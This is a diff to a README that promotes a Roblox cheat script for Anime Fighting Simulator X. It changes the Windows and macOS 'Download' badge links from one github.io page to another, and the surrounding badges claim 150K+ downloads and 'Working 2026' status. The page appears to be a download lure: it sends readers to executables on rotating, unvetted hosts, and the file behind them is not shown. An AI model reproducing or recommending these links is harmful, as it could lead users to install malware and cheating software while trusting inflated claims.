@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download AFS Script](https://img.shields.io/badge/Download%20AFS%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download AFS Script](https://img.shields.io/badge/Download%20AFS%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **AFS Script** for Anime Fighting Simulator X — auto-farm, E
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 </div>
 
